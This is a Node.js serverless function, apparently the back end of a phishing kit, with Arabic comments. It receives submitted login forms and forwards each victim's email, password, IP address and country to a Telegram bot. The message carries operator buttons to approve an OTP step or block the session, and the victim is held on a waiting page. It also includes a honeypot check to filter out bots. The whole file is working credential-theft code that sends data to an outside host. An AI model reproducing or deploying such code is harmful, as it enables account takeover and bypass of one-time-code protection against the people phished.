const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid'); 

const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};

exports.handler = async (event, context) => {
    
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    const ip = getClientIp(event.headers); 
    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
    const bodyParams = new URLSearchParams(event.body);
    const botTrapValue = bodyParams.get('bot_trap');
    
    // 1. فحص Honeypot (الحظر الفوري)
    if (botTrapValue) {
        return { statusCode: 303, headers: { Location: '/waiting.html' } };
    }
    
    // ----------------------------------------------------------------
    // 2. إدارة الجلسة وإرسال Telegram
    // ----------------------------------------------------------------
    
    // **إنشاء معرّف الجلسة الفريد**
    const sessionId = uuidv4(); 

    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    
    // **TODO: تخزين الحالة الأولية في قاعدة بياناتك الخارجية**
    // يجب تخزين: { id: sessionId, status: 'pending', email: email, password: password, ip: ip }
    // ...
    
    // ---------------------------------------------------------------
    // 3. بناء أزرار Telegram المضمنة (Inline Keyboard)
    // ---------------------------------------------------------------
    
    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: "✅ الموافقة (OTP)", callback_data: `action=approved&id=${sessionId}` },
                { text: "❌ الرفض (Block)", callback_data: `action=rejected&id=${sessionId}` }
            ]
        ]
    };
    
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);
    const safe_country = escapeMarkdownV2(countryCode);
    
    let message_text = `🚨 *APPROVAL REQUIRED \\(Donsaa\\)* 🚨\\n\\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\\n`;
    message_text += `Passwort: \`${safe_password}\`\\n`;
    message_text += `IP: \`${safe_ip}\`\\n`;
    message_text += `Country: \`${safe_country}\`\\n\\n`;
    message_text += `*Session ID: \\`${sessionId}\\`*`;
    
    // ---------------------------------------------------------------
    // 4. إرسال الرسالة مع الأزرار
    // ---------------------------------------------------------------
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message_text,
                    parse_mode: 'MarkdownV2',
                    reply_markup: inlineKeyboard
                })
            });
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }
    
    // 5. التحويل إلى صفحة الانتظار مع تمرير Session ID
    return {
        statusCode: 303,
        headers: {
            Location: `/waiting.html?id=${sessionId}`,
        },
    };
};
